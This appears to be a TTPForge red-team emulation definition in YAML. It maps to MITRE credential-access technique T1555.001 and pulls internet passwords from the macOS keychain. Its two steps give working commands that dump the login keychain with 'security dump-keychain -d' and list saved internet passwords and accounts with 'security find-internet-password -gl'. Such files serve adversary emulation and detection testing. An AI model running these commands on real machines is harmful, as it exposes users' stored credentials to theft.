---
api_version: 2.0
uuid: 5911af64-5e6e-4c16-8713-11e925b2713e
name: Extract Internet Passwords
authors:
- TTPForge
description: |
  Extract internet passwords from macOS keychain
mitre:
  tactics:
  - TA0006 Credential Access
  techniques:
  - T1555 Credentials from Password Stores
  subtechniques:
  - 'T1555.001 Credentials from Password Stores: Keychain'
requirements:
  platforms:
  - os: darwin
args:
- name: service_name
  description: Specific service to query (optional)
  type: string
  default: ''
steps:
- name: List Internet Passwords
  inline: security dump-keychain -d login.keychain-db 2>/dev/null | grep -i 'srvce\|acct' | head -30
- name: Extract Password for Service
  inline: security find-internet-password -gl 2>&1 | grep -E 'password|account' | head -20
tests:
- name: dry_run_test
  dry_run: true
